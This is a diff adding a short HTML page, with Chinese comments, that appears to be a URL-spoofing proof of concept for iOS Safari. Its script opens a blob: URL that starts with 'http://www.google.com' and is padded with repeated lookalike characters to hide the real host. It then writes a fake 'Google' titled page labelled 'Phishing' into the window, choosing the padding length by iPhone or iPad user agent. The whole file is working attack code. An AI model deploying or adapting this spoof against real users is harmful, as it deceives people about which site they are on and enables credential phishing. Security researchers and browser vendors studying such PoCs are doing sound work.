@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script>
+        // 打开一个新窗口并向其写入指定内容
+        function openWindowWithContent() {
+            var newWindow = window.open('', 'aaaa');
+            newWindow.document.write("<h1>Phishing</h1><title>Google</title>");
+        }
+
+        // 为 iPad 设备打开特定 URL，并在 500 毫秒后调用 openWindowWithContent 函数
+        function handleiPad() {
+            var url = 'blob:http://www.google.com' + Array(80).join("%EF%B9%BA") + '@xisigr.com';
+            var newWindow = window.open(url, 'aaaa');
+            setTimeout(openWindowWithContent, 500);
+        }
+
+        // 为 iPhone 设备打开特定 URL，并在 500 毫秒后调用 openWindowWithContent 函数
+        function handleiPhone() {
+            var url = 'blob:http://www.google.com' + Array(32).join("%EF%B9%BA") + '@xisigr.com';
+            var newWindow = window.open(url, 'aaaa');
+            setTimeout(openWindowWithContent, 500);
+        }
+
+        // 根据用户设备类型创建一个 Blob 对象并打开新窗口
+        function createBlobAndOpenWindow() {
+            var blob = new Blob([], { type: "text/html; charset=utf-8" });
+            var blobUrl = URL.createObjectURL(blob);
+            var newWindow = window.open(blobUrl, 'aaaa');
+            
+            // 检查用户设备类型并相应调用处理函数
+            if (navigator.userAgent.indexOf("iPhone") > -1) {
+                setTimeout(handleiPhone, 500);
+            } else if (navigator.userAgent.indexOf("iPad") > -1) {
+                setTimeout(handleiPad, 500);
+            }
+        }
+    </script>
+</head>
+<body>
+    <!-- 点击按钮后调用 createBlobAndOpenWindow 函数 -->
+    <button onclick="createBlobAndOpenWindow()">Click me</button>
+</body>
+</html>
